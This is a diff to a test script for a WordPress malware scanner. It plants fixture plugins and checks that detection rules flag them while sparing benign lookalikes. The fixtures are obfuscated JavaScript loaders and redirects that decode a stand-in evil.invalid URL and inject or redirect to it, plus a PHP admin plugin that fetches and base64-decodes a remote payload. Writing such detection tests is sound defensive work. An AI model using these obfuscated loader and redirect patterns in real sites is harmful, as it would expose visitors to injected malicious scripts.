@@ -4,7 +4,14 @@ ROOTDIR="$(cd "$(dirname "$0")/.." && pwd)"
 TMP="${TMPDIR:-/tmp}/presswarden-threat-intel.$$"
 trap 'rm -rf "$TMP"' EXIT
 SITE="$TMP/sites/example.com/public_html"
-mkdir -p "$SITE/wp-admin" "$SITE/wp-content/plugins/malicious-js" "$SITE/wp-content/plugins/benign-js" "$SITE/wp-content/plugins/admin-target" "$SITE/wp-content/plugins/benign-admin" "$SITE/wp-includes"
+mkdir -p "$SITE/wp-admin" \
+  "$SITE/wp-content/plugins/malicious-js" \
+  "$SITE/wp-content/plugins/multi-js" \
+  "$SITE/wp-content/plugins/benign-js" \
+  "$SITE/wp-content/plugins/admin-target" \
+  "$SITE/wp-content/plugins/admin-hook-only" \
+  "$SITE/wp-content/plugins/benign-admin" \
+  "$SITE/wp-includes"
 touch "$SITE/wp-settings.php" "$SITE/wp-load.php"
 printf '<?php $wp_version = "7.1";\n' > "$SITE/wp-includes/version.php"
 
@@ -14,6 +21,16 @@ JS
 cat > "$SITE/wp-content/plugins/malicious-js/redirect.js" <<'JS'
 var u=String.fromCharCode(104,116,116,112,115,58,47,47,101,118,105,108,46,105,110,118,97,108,105,100);window.location.href=u;
 JS
+
+# The first decoded variable is intentionally harmless. Detectors must inspect
+# every decoder assignment and still follow the later value into the sink.
+cat > "$SITE/wp-content/plugins/multi-js/loader.js" <<'JS'
+var harmless=atob('aGVsbG8=');console.log(harmless);var payload=atob('aHR0cHM6Ly9ldmlsLmludmFsaWQveC5qcw==');var s=document.createElement('script');s.src=payload;document.head.appendChild(s);
+JS
+cat > "$SITE/wp-content/plugins/multi-js/redirect.js" <<'JS'
+const harmless=atob('aGVsbG8=');console.log(harmless);const target=atob('aHR0cHM6Ly9ldmlsLmludmFsaWQ=');window.location.replace(target);
+JS
+
 cat > "$SITE/wp-content/plugins/benign-js/loader.js" <<'JS'
 (function(){var decoded=atob('aGVsbG8=');console.log(decoded);var s=document.createElement('script');s.src='https://cdn.example.com/app.js';document.head.appendChild(s);}());
 JS
@@ -32,6 +49,22 @@ if (is_admin() && current_user_can('manage_options')) {
     }
 }
 PHP
+
+# Hook registration is not itself a browser/output sink. This deliberately has
+# every other PW-PHP-006 signal and must remain clean until the payload is
+# actually emitted or passed to a browser-script API.
+cat > "$SITE/wp-content/plugins/admin-hook-only/plugin.php" <<'PHP'
+<?php
+if (is_admin() && current_user_can('manage_options')) {
+    $ua = $_SERVER['HTTP_USER_AGENT'];
+    if (strpos($ua, 'Windows') !== false) {
+        $r = wp_remote_get('https://example.invalid/payload');
+        $js = base64_decode(wp_remote_retrieve_body($r));
+        add_action('admin_footer', function () use ($js) { return $js; });
+    }
+}
+PHP
+
 cat > "$SITE/wp-content/plugins/benign-admin/plugin.php" <<'PHP'
 <?php
 if (is_admin() && current_user_can('manage_options')) {
@@ -42,8 +75,10 @@ PHP
 js_out=$(ROOT="$TMP/sites" PRESSWARDEN_CONFIG_FILE="$TMP/no-config" PRESSWARDEN_STATE_DIR="$TMP/state-js" PRESSWARDEN_CACHE_DIR="$TMP/cache-js" PRESSWARDEN_NOCOLOR=1 bash "$ROOTDIR/checks/js-threat-intel.sh" 2>&1 || true)
 printf '%s\n' "$js_out" | grep -q 'PW-JS-002'
 printf '%s\n' "$js_out" | grep -q 'malicious-js/loader.js'
+printf '%s\n' "$js_out" | grep -q 'multi-js/loader.js'
 printf '%s\n' "$js_out" | grep -q 'PW-JS-004'
 printf '%s\n' "$js_out" | grep -q 'malicious-js/redirect.js'
+printf '%s\n' "$js_out" | grep -q 'multi-js/redirect.js'
 if printf '%s\n' "$js_out" | grep -q 'benign-js/'; then
   printf '%s\n' "$js_out" >&2
   printf 'benign JavaScript lookalike was falsely flagged\n' >&2
@@ -53,9 +88,9 @@ fi
 php_out=$(ROOT="$TMP/sites" PRESSWARDEN_CONFIG_FILE="$TMP/no-config" PRESSWARDEN_STATE_DIR="$TMP/state-php" PRESSWARDEN_CACHE_DIR="$TMP/cache-php" PRESSWARDEN_NOCOLOR=1 bash "$ROOTDIR/checks/php-threat-intel.sh" 2>&1 || true)
 printf '%s\n' "$php_out" | grep -q 'PW-PHP-006'
 printf '%s\n' "$php_out" | grep -q 'admin-target/payload.php'
-if printf '%s\n' "$php_out" | grep -q 'benign-admin/plugin.php'; then
+if printf '%s\n' "$php_out" | grep -qE 'benign-admin/plugin.php|admin-hook-only/plugin.php'; then
   printf '%s\n' "$php_out" >&2
-  printf 'benign admin asset loader was falsely flagged\n' >&2
+  printf 'benign/non-output admin behavior was falsely flagged\n' >&2
   exit 1
 fi
 
